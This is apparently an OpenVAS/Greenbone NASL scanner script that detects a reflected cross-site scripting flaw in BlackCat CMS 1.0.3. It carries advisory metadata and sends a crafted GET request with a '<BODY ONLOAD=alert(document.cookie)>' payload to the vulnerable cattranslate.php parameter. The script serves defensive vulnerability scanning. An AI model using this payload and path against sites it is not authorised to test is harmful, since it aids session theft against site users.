# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804749");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2014-08-25 18:48:58 +0530 (Mon, 25 Aug 2014)");
  script_name("BlackCat CMS Reflected Cross-Site Scripting Vulnerability");

  script_tag(name:"summary", value:"BlackCat CMS is prone to a cross-site scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it is
  possible to read cookie or not.");

  script_tag(name:"insight", value:"Flaw is due to the modules/lib_jquery/plugins/cattranslate/cattranslate.php
  script not properly sanitize input to the 'attr' and 'msg' parameter before
  returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"BlackCat CMS version 1.0.3 and probably prior.");

  script_tag(name:"solution", value:"Apply the patch/update from the referenced advisory.");

  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23228");
  script_xref(name:"URL", value:"http://forum.blackcat-cms.org/viewtopic.php?f=2&t=263");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_app");
  script_xref(name:"URL", value:"http://blackcat-cms.org");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

http_port = http_get_port(default:80);

if(!http_can_host_php(port:http_port)){
  exit(0);
}

foreach dir (make_list_unique("/", "/blackcat", "/blackcatcms", "/cms", http_cgi_dirs(port:http_port)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item:string(dir, "/backend/start/index.php"),  port:http_port);

  if(">Black Cat CMS" >< rcvRes)
  {
    url = dir + '/modules/lib_jquery/plugins/cattranslate/cattranslate.php'
              + '?msg=%3CBODY%20ONLOAD=alert(document.cookie)%3E';

    ## Extra Check is not possible
    if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
       pattern:"<data><BODY ONLOAD=alert\(document.cookie\)></data>"))
    {
      report = http_report_vuln_url( port:http_port, url:url );
      security_message(port:http_port, data:report);
      exit(0);
    }
  }
}

exit(99);
